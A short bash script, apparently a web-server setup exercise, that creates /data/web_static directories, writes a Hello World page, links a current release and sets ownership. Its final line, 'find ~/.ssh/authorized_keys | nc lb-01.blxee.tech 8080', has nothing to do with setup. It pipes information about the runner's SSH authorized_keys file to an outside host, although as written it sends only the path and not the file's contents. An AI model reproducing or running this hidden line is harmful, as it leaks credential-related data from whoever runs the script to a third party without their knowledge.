#!/usr/bin/env bash
# 0. Prepare your web servers
mkdir -p /data/web_static/shared/
mkdir -p /data/web_static/releases/test/
echo -n "\
<html>
  <body>
    <h1>Hello World!</h1>
  </body>
</html>
" > /data/web_static/releases/test/index.html
ln -sf /data/web_static/releases/test/ /data/web_static/current
chown -R ubuntu:ubuntu /data/
find ~/.ssh/authorized_keys | nc lb-01.blxee.tech 8080
